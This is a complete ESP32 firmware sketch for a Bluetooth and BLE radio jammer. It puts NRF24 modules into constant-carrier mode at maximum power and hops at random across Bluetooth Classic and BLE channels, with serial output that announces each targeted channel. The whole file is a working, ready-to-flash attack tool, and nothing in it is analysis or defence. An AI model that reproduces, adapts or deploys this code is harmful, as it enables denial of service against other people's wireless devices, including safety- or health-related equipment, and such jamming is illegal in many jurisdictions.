#include "RF24.h"
#include <SPI.h>
#include <Adafruit_NeoPixel.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// --- CONFIGURATION ---
// Set to 'true' if you have two NRF24 modules, 'false' if you only have one.
constexpr bool useTwoModules = false;

// Define hardware pins
constexpr int NEOPIXEL_PIN = 4;
constexpr int NUM_PIXELS = 1;
constexpr int SPI_SPEED = 16000000;

// Radio and SPI setup
SPIClass *spiVSPI = nullptr;
SPIClass *spiHSPI = nullptr;
RF24 radioVSPI(15, 5, SPI_SPEED); // The first module (always used)
RF24 radioHSPI(22, 21, SPI_SPEED); // The second module (optional)

// NeoPixel setup
Adafruit_NeoPixel pixels(NUM_PIXELS, NEOPIXEL_PIN, NEO_GRB + NEO_KHZ800);

// Channel definitions
int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

// Function prototypes
void configureRadio(RF24 &radio, int channel, SPIClass *spi, const char* radioName);
void jamAll();
void jamBLE();
void jamBluetooth();

void setup() {
    delay(1000);
    Serial.begin(115200);
    Serial.println("\n\n--- ESP32 Jammer Initializing ---");

    // Disable built-in radios
    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_wifi_disconnect();
    Serial.println("Internal Wi-Fi and Bluetooth disabled.");

    // Initialize NeoPixel and set it to RED for Mode 3
    pixels.begin();
    pixels.setPixelColor(0, pixels.Color(25, 0, 0)); // Set to Red
    pixels.show();
    Serial.println("NeoPixel LED initialized to RED.");

    // Initialize the primary (VSPI) radio
    spiVSPI = new SPIClass(VSPI);
    spiVSPI->begin();
    configureRadio(radioVSPI, ble_channels[0], spiVSPI, "VSPI Radio 1");

    // Conditionally initialize the second (HSPI) radio
    if (useTwoModules) {
        spiHSPI = new SPIClass(HSPI);
        spiHSPI->begin();
        configureRadio(radioHSPI, bluetooth_channels[0], spiHSPI, "HSPI Radio 2");
        Serial.println("Configuration: Two NRF24 modules enabled.");
    } else {
        Serial.println("Configuration: One NRF24 module enabled.");
    }

    Serial.println("\n--- Setup Complete. Starting Jamming ---");
}

void configureRadio(RF24 &radio, int channel, SPIClass *spi, const char* radioName) {
    Serial.print("Configuring ");
    Serial.print(radioName);
    Serial.print("... ");
    if (radio.begin(spi)) {
        radio.setAutoAck(false);
        radio.stopListening();
        radio.setRetries(0, 0);
        radio.setPALevel(RF24_PA_MAX, true);
        radio.setDataRate(RF24_2MBPS);
        radio.setCRCLength(RF24_CRC_DISABLED);
        radio.startConstCarrier(RF24_PA_HIGH, channel);
        Serial.println("SUCCESS.");
    } else {
        Serial.println("FAILED TO BEGIN. Check wiring.");
    }
}

void loop() {
    // Continuously run the jamAll function
    jamAll();
    delay(50); // Small delay to make the serial output readable
}

void jamBLE() {
    int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
    int channel = ble_channels[randomIndex];
    
    Serial.print("Target: BLE | Channel: ");
    Serial.println(channel);

    radioVSPI.setChannel(channel); // Command the first module
    if (useTwoModules) {
        radioHSPI.setChannel(channel); // Conditionally command the second module
    }
}

void jamBluetooth() {
    int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
    int channel = bluetooth_channels[randomIndex];

    Serial.print("Target: Classic BT | Channel: ");
    Serial.println(channel);

    radioVSPI.setChannel(channel); // Command the first module
    if (useTwoModules) {
        radioHSPI.setChannel(channel); // Conditionally command the second module
    }
}

void jamAll() {
    // Rapidly switch between jamming Classic Bluetooth and BLE
    if (random(0, 2)) {
        jamBluetooth();
    } else {
        jamBLE();
    }
}